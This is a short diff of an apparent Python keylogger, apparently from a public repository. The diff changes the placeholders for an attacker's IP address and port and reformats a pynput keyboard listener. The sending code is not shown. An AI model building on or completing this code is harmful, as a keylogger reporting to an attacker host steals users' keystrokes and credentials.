@@ -6,10 +6,10 @@ import threading
 
 
 #attacker prefered ip adress
-ipadress="server_ipadress"
+ipadress="ip_address"
 
 #attacker prefered port adress
-port="listening_port_adress"
+port="listened_port_address"
 
 curworkdir=os.getcwd()
 
@@ -53,14 +53,11 @@ def on_press(key):
     
 
 def on_release(key):
-    print('{0} released'.format(
-        key))
+    print('{0} released'.format(key))
     
 
 # Collecting events until released
-with keyboard.Listener(
-        on_press=on_press,
-        on_release=on_release) as listener:
+with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
     listener.join()
 
 
